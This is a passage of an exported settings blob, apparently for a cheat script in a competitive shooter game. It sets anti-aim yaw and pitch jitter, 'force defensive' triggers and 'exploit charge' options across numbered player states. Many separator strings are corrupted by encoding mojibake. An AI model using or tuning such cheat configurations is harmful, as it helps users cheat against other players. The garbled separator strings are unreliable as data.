¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF001"",""7.defensive_pitch_variance"":0,""10.yaw_jitter_offset"":0,""1.defensive_pitch_variance"":0,""11.yaw_offset"":0,""9.defensive_pitch_variance"":0,""2.pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF002"",""5.defensive_pitch_variance"":0,""7.yaw_jitter_type"":""Offset"",""6.pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF006"",""3.defensive_pitch_variance"":0,""11.yaw_jitter_right"":0,""6.freestanding"":false,""4.freestanding"":false,""12.defensive_yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0012"",""10.yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0010"",""11.yaw"":""Offset"",""2.freestanding"":false,""5.yaw_jitter_type"":""Offset"",""event_logs"":true,""2.defensive_yaw_jitter_delay"":1,""1.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""force_defensive"":true,""3.defensive_angles_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF003"",""1.yaw_jitter_type"":""Offset"",""8.defensive_yaw_jitter_delay"":1,""2.yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF002"",""5.yaw_jitter_left"":0,""4.yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF004"",""9.defensive_yaw_jitter1"":false,""3.yaw_jitter_type"":""Left \/ Right"",""3.defensive_yaw_jitter1"":false,""3.yaw_jitter_right"":64,""10.defensive_yaw_jitter_type"":""Offset"",""13.yaw_jitter_delay"":1,""7.yaw_jitter_right"":0,""1.defensive_yaw_jitter1"":false,""5.yaw_jitter_right"":0,""1.yaw_jitter_left"":0,""13.defensive_pitch_offset1"":0,""9.defensive_angles_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF009"",""5.defensive_angles_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF005"",""8.yaw_offset"":0,""10.defensive_pitch_variance"":0,""avoid_backstab"":true,""8.defensive_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF008"",""13.body_yaw_offset"":0,""12.defensive_yaw_jitter2"":""Off"",""8.defensive_yaw_jitter_left"":0,""4.yaw_left"":-9,""13.yaw_right"":0,""1.defensive_yaw_type"":""Random"",""4.override"":true,""10.freestanding"":false,""12.defensive_yaw_jitter_variance"":0,""12.defensive_pitch_offset"":0,""13.yaw_delay"":1,""safe_head_states"":[""Height"",""In air"",""Distance""],""12.defensive_yaw_jitter_offset"":0,""6.defensive_yaw_jitter_left"":0,""8.yaw_left"":0,""animations_lean"":50,""6.yaw_left"":0,""6.override"":false,""2.yaw_left"":-3,""11.defensive_pitch"":false,""2.override"":true,""12.defensive_yaw_type"":""Random"",""12.yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0012"",""13.defensive_pitch_delay"":1,""12.body_yaw"":""Static"",""8.freestanding"":false,""8.yaw"":""Off"",""13.override"":true,""10.defensive_angles_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0010"",""6.defensive_pitch"":false,""12.defensive_yaw_offset"":180,""6.defensive_pitch_delay"":1,""11.defensive_pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0011"",""13.defensive_yaw_jitter_left"":0,""1.defensive_yaw_delay"":1,""8.defensive_pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF008"",""13.defensive_yaw_jitter_delay"":1,""9.yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF009"",""2.defensive_pitch_offset"":0,""13.defensive_yaw_jitter1"":false,""8.defensive_pitch_delay"":1,""10.yaw_variance"":0,""6.defensive_pitch_offset"":0,""4.defensive_pitch_offset"":0,""10.defensive_yaw_variance"":0,""4.defensive_pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF004"",""6.defensive_pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF006"",""10.body_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0010"",""13.freestanding_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0013"",""9.defensive_yaw_type"":""Random"",""5.defensive_yaw_delay"":1,""7.defensive_yaw_type"":""Random"",""3.defensive_yaw_delay"":1,""5.defensive_yaw_type"":""Random"",""8.defensive_pitch_offset"":0,""3.defensive_yaw_type"":""Random"",""8.defensive_pitch_offset1"":0,""shadows_type"":""Bright"",""2.defensive_pitch_offset1"":0,""6.defensive_pitch_offset1"":0,""4.defensive_pitch_offset1"":0,""13.defensive_yaw_delay"":1,""2.pitch_offset"":0,""3.yaw_variance"":0,""1.defensive_yaw_jitter_type"":""Offset"",""5.yaw_variance"":0,""3.defensive_yaw_jitter_type"":""Offset"",""4.body_yaw"":""Jitter"",""9.defensive_yaw_variance"":0,""improvements_triggers"":[""Quick peek assist"",""Exploit charge"",""On shot anti-aim""],""7.defensive_yaw_variance"":0,""6.yaw"":""Off"",""9.defensive_yaw_jitter_type"":""Offset"",""12.yaw_jitter_type"":""Offset"",""1.defensive_yaw_variance"":0,""11.defensive_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0011"",""5.defensive_yaw_variance"":0,""6.pitch_offset"":0,""3.defensive_yaw_variance"":0,""2.defensive_yaw_jitter_left"":0,""4.defensive_angles"":false,""4.defensive_yaw_jitter_left"":0,""6.defensive_angles"":false,""12.defensive_yaw_jitter_right"":0,""13.yaw_jitter_offset"":0,""13.defensive_pitch_offset2"":0,""12.yaw_offset"":0,""9.yaw_base"":""Local view"",""13.defensive_pitch_type"":""Switch"",""13.yaw_jitter"":""Off"",""viewmodel_horizontal"":25,""12.yaw"":""Offset"",""1.yaw_base"":""Local view"",""7.yaw_base"":""At targets"",""12.yaw_jitter_right"":0,""2.defensive_yaw_jitter_variance"":0,""3.yaw_base"":""At targets"",""13.defensive_yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0013"",""drop_grenades"":false,""9.yaw_jitter_offset"":0,""1.defensive_yaw_offset"":180,""3.yaw_jitter_offset"":0,""1.yaw_jitter_offset"":0,""7.yaw_jitter_offset"":47,""5.yaw_jitter_offset"":28,""12.yaw_base"":""Local view"",""10.yaw_left"":0,""5.yaw_base"":""At targets"",""force_defensive_triggers"":[""Weapon switch"",""Damage received"",""Reloading"",""Flashed""],""edge_yaw"":false,""3.yaw"":""Left \/ Right"",""8.defensive_yaw_offset"":180,""12.defensive_angles"":false,""12.bombsite_fix"":false,""8.defensive_angles"":false,""13.defensive_yaw_jitter_type"":""Offset"",""10.defensive_pitch_offset1"":0,""9.defensive_pitch"":false,""11.force_defensive"":false,""2.defensive_angles"":false,""10.yaw_jitter_delay"":1,""12.pitch"":""Down"",""11.defensive_pitch_variance"":0,""4.yaw_delay"":1,""2.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF002"",""11.body_yaw"":""Opposite"",""6.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""10.body_yaw_offset"":0,""13.defensive_yaw_jitter2"":""Off"",""viewmodel_in_scope"":false,""2.pitch"":""Down"",""4.yaw_right"":23,""8.yaw_delay"":1,""9.defensive_pitch_offset2"":0,""10.yaw_right"":0,""13.freestanding"":false,""8.pitch"":""Off"",""13.defensive_yaw_jitter_variance"":0,""4.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""9.defensive_yaw_jitter2"":""Off"",""13.defensive_pitch_offset"":0,""3.defensive_yaw_jitter2"":""Off"",""8.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF008"",""5.defensive_yaw_jitter2"":""Off"",""10.yaw_delay"":1,""9.defensive_pitch_type"":""Switch"",""10.yaw_jitter_left"":0,""5.defensive_pitch_type"":""Switch"",""11.defensive_yaw_type"":""Random"",""7.defensive_pitch_type"":""Switch"",""12.defensive_pitch"":false,""1.defensive_pitch_type"":""Switch"",""1.body_yaw_offset"":0,""3.defensive_pitch_type"":""Switch"",""7.defensive_yaw_jitter_type"":""Offset"",""6.yaw_jitter"":""Off"",""13.yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""2.yaw_right"":12,""aspect_ratio"":false,""13.yaw_jitter_variance"":0,""3.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""8.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF008"",""7.defensive_yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""5.defensive_yaw_jitter_type"":""Offset"",""13.defensive_yaw_offset"":180,""12.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""13.defensive_angles_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0013"",""8.yaw_jitter"":""Off"",""12.defensive_yaw_jitter_left"":0,""9.body_yaw_offset"":0,""12.defensive_pitch_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""7.body_yaw_offset"":-59,""shadows_distance"":650,""5.body_yaw_offset"":-124,""12.defensive_yaw_jitter_delay"":1,""8.yaw_jitter_variance"":0,""11.defensive_yaw_variance"":0,""11.yaw_variance"":0,""9.defensive_yaw_jitter_offset"":0,""10.defensive_yaw_jitter1"":false,""5.force_defensive"":true,""1.bombsite_fix"":false,""7.force_defensive"":true,""1.force_defensive"":false,""12.freestanding_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF0012"",""9.bombsite_fix"":false,""3.defensive_yaw_jitter_offset"":0,""7.defensive_yaw_jitter_right"":0,""5.defensive_yaw_jitter_right"":0,""9.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF009"",""3.defensive_yaw_jitter_right"":0,""6.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF006"",""6.yaw_jitter_variance"":0,""4.yaw_jitter_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF004"",""9.yaw_variance"":0,""10.defensive_yaw_delay"":1,""1.yaw_variance"":0,""3.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF003"",""1.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF001"",""7.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""viewmodel"":false,""5.separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF005"",""7.body_yaw_separator"":""\u0007404040FFâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾\u0007FFFFFF007"",""4.yaw_jitter_delay"